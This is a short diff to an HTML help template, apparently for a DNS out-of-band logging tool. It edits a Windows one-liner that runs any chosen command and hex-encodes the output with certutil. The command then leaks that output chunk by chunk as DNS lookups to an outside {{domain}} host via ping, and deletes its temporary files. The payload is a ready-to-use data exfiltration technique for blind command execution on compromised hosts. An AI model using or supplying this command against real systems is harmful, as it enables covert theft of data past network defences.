@@ -81,8 +81,7 @@
                     </div>
                     <br>
                     <div class="callout callout-info">Windows:  
-                        <code>set CMD="这里填你的命令" && set /a _random=%RANDOM% * 9000 / 32768 + 1000
-                            echo %random% && %CMD% > execfile7 && certutil -encodehex -f execfile7 execfile7.txt 4 && (for /f "Delims=: Tokens=1-2" %a in ('findstr /n . execfile7.txt') do (for /f "Tokens=1-16" %c in ('echo %b')do ping -nc 1 %c%d%e%f%g%h%i%j%k%l%m%n%o%p%q%r.%a.%_random%.cmd.{{domain}})) && del execfile7 && del execfile7.txt
+                        <code>set CMD="这里填你的命令" && set /a _random=%RANDOM% && %CMD% > execfile7 && certutil -encodehex -f execfile7 execfile7.txt 4 && (for /f "Delims=: Tokens=1-2" %a in ('findstr /n . execfile7.txt') do (for /f "Tokens=1-16" %c in ('echo %b')do ping -nc 1 %c%d%e%f%g%h%i%j%k%l%m%n%o%p%q%r.%a.%_random%.cmd.{{domain}})) && del execfile7 && del execfile7.txt
                         </code>
                     </div>
                     <br>
